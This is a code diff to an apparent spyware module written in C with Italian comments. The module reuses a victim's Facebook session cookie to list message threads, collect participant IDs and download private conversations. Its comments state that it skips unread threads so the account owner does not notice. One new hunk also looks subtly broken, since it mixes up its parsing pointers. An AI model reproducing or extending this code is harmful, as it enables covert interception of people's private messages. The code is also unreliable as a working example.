@@ -6,10 +6,19 @@
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
+#define FB_THREAD_LIST_ID "\"threads\":[{"
 #define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
+#define FB_THREAD_IDENTIFIER_V2 "\"thread_id\":\""
+
 #define FB_THREAD_AUTHOR_IDENTIFIER "class=\\\"authors\\\">"
+#define FB_THREAD_AUTHOR_IDENTIFIER_V2 "\"DocumentTitle.set(\\\""
+
 #define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft"
+#define FB_THREAD_STATUS_IDENTIFIER_V2 "\"unread_count\":"
+
 #define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
+#define FB_MESSAGE_TSTAMP_IDENTIFIER_V2 "\"timestamp\":"
+
 #define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
 #define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
 #define FB_MESSAGE_SCREEN_NAME_ID "\"id\":\"%s\",\"name\":\""
@@ -117,7 +126,6 @@ DWORD HandleFBMessages(char *cookie)
 	BOOL me_present = FALSE;
 	BYTE *parser1, *parser2;
 	BYTE *parser_inner1, *parser_inner2;
-	WCHAR fb_request[256];
 	BOOL is_incoming = FALSE;
 	char peers[512];
 	char peers_id[256];
@@ -188,10 +196,11 @@ DWORD HandleFBMessages(char *cookie)
 	if (last_tstamp == FB_INVALID_TSTAMP)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
-	// Costruisce il contenuto per le successive POST ajax
+	// Prende la lista dei thread
 	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
+
 	parser1 = (BYTE *)strstr((char *)r_buffer, FB_POST_FORM_ID);
 	if (parser1) {
 		parser1 += strlen(FB_POST_FORM_ID);
@@ -226,28 +235,32 @@ DWORD HandleFBMessages(char *cookie)
 	_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "post_form_id=%s&fb_dtsg=%s&lsd&post_form_id_source=AsyncRequest&__user=%s&phstamp=145816710610967116112122", form_id, dtsg_id, user);
 
 	// Chiede la lista dei thread
-	swprintf_s(fb_request, L"ajax/messaging/async.php?sk=inbox&offset=0&limit=%d&__a=1", FACEBOOK_THREAD_LIMIT);
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", fb_request, 443, (BYTE *)post_data, strlen(post_data), &r_buffer, &response_len, cookie);
-	
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	parser1 = r_buffer;
+	// Cicla la lista dei thread
+	parser1 = (BYTE *)strstr((char *)r_buffer, FB_THREAD_LIST_ID);
+	if (!parser1) {
+		SAFE_FREE(r_buffer);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+
 	for (;;) {
 		CheckProcessStatus();
-		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER);
-		if (!parser1)
+		parser2 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER_V2);
+		if (!parser2)
 			break;
-		parser1 += strlen(FB_THREAD_STATUS_IDENTIFIER);
+		parser2 += strlen(FB_THREAD_STATUS_IDENTIFIER_V2);
 		// Salta i thread unread per non cambiare il loro stato!!!!
-		if(!strncmp((char *)parser1, " unread", strlen(" unread")))
+		if(*parser2 != '0')
 			continue;
 
-		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER);
+		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER_V2);
 		if (!parser1)
 			break;
-		parser1 += strlen(FB_THREAD_IDENTIFIER);
-		parser2 = (BYTE *)strstr((char *)parser1, "\\\" ");
+		parser1 += strlen(FB_THREAD_IDENTIFIER_V2);
+		parser2 = (BYTE *)strstr((char *)parser1, "\"");
 		if (!parser2)
 			break;
 		*parser2 = 0;
@@ -257,26 +270,46 @@ DWORD HandleFBMessages(char *cookie)
 		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1&msgs_only=1", parser1);
 		parser1 = parser2 + 1;
 
-		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
+		// Cerca gli id dei partecipanti
+		memset(peers_id, 0, sizeof(peers_id));
+		me_present = FALSE;
+		for (;;) {
+			parser2 = (BYTE *)strstr((char *)parser1, FB_PEER_ID_IDENTIFIER);
+			if (!parser2)
+				break;
+			parser1 = parser2 + strlen(FB_PEER_ID_IDENTIFIER);
+			parser2 = (BYTE *)strstr((char *)parser1, "\"");
+			if (!parser2)
+				break;
+			*parser2 = 0;
+
+			if (!strcmp((CHAR *)parser1, user))
+				me_present = TRUE;
+
+			if (strlen(peers_id) == 0)
+				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser1);
+			else
+				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser1);
+			
+			parser1 = parser2 +1;
+
+			// Smette quando sono finiti i participants
+			if (*parser1 == ']')
+				break;
+		}	
+		if (!me_present)
+			_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, user);
+
+		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER_V2);
 		if (!parser1)
 			break;
-		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
+		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER_V2);
 		memset(tstamp, 0, sizeof(tstamp));
 		memcpy(tstamp, parser1, 10);
 		act_tstamp = atoi(tstamp);
+		act_tstamp/=1000; // Qui il tstamp e' moltiplicato per 1000 rispetto ai valori degli altri campi!
 		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
 			continue;
-
-		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_AUTHOR_IDENTIFIER);
-		if (!parser1)
-			break;
-		parser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER);
-		parser2 = (BYTE *)strstr((char *)parser1, "\\u003C\\/");
-		if (!parser2)
-			break;
-		*parser2 = 0;
-		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser1);
-		parser1 = parser2 + 1;
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
 		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
@@ -285,33 +318,19 @@ DWORD HandleFBMessages(char *cookie)
 			return ret_val;
 		}
 
-		// Cerca gli id dei peers
+		// Prende gli screenname di tutti i partecipanti
 		parser_inner1 = r_buffer_inner;
-		memset(peers_id, 0, sizeof(peers_id));
-		me_present = FALSE;
-		for (;;) {
-			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_PEER_ID_IDENTIFIER);
-			if (!parser_inner2)
-				break;
-			parser_inner1 = parser_inner2 + strlen(FB_PEER_ID_IDENTIFIER);
-			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\"");
-			if (!parser_inner2)
-				break;
-			*parser_inner2 = 0;
+		parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_THREAD_AUTHOR_IDENTIFIER_V2);
+		if (!parser_inner1)
+			break;
+		parser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER_V2);
+		parser2 = (BYTE *)strstr((char *)parser1, " - ");
+		if (!parser2)
+			break;
+		*parser2 = 0;
+		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser1);
 
-			if (!strcmp((CHAR *)parser_inner1, user))
-				me_present = TRUE;
-
-			if (strlen(peers_id) == 0)
-				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
-			else
-				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser_inner1);
-			
-			parser_inner1 = parser_inner2 +1;
-		}	
-		if (!me_present)
-			_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, user);
-
+		parser_inner1 = r_buffer_inner;
 		// Clicla per tutti i messaggi del thread
 		for (;;) {			
 			CheckProcessStatus();
